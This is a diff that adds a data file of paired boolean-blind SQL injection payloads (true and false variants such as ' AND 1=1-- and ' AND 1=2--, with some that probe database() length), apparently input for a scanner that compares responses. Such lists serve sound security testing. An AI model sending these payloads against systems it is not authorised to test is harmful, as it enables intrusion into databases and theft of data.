@@ -1,0 +1,13 @@
+# Boolean-Blind SQL Injection Payloads
+# Format: TRUE_PAYLOAD|||FALSE_PAYLOAD
+# Scanner sends both and compares response differences
+' AND 1=1--|||' AND 1=2--
+' AND 'a'='a'--|||' AND 'a'='b'--
+" AND 1=1--|||" AND 1=2--
+' AND 1=1#|||' AND 1=2#
+') AND 1=1--|||') AND 1=2--
+' AND SUBSTRING('a',1,1)='a'--|||' AND SUBSTRING('a',1,1)='b'--
+1 AND 1=1|||1 AND 1=2
+1) AND 1=1--(|||1) AND 1=2--(
+' OR 1=1--|||' OR 1=2--
+' AND LENGTH(database())>0--|||' AND LENGTH(database())<0--
